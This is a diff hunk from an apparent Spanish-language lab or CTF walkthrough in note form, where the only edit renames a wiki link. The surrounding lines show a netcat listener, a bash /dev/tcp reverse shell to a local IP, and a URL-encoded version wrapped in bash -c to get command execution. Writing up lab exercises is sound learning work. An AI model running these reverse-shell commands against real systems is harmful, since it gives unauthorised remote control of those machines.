@@ -36,7 +36,7 @@ Nos pondremos en escucha con `nc -lvnp 9001`
 Luego, necesitamos una revershell que nos funcione. En este caso utilizaré la siguiente ```sh -i >& /dev/tcp/192.168.0.17/9001 0>&1```. Corremos y vemos que no está interpretando la revershell. La encodeamos en formato URL y nos sale lo siguiente `sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.17%2F9001%200%3E%261`. Nos sigue sin funcionar entonces probamos poniendo todo entre comillas y agregarle un `bash -c` al incio del comando. Todo unido nos daría lo siguiente `bash -c "sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.17%2F9001%200%3E%261"`. Obtenemos la [[reverse shell]]!!
 ![[Pasted image 20240710003818.png]]
 
-Una vez con la shell generamos una [[shell interactiva]].
+Una vez con la shell generamos una [[Interactive Shell]].
 
 ## Escalada de privilegios
 ---
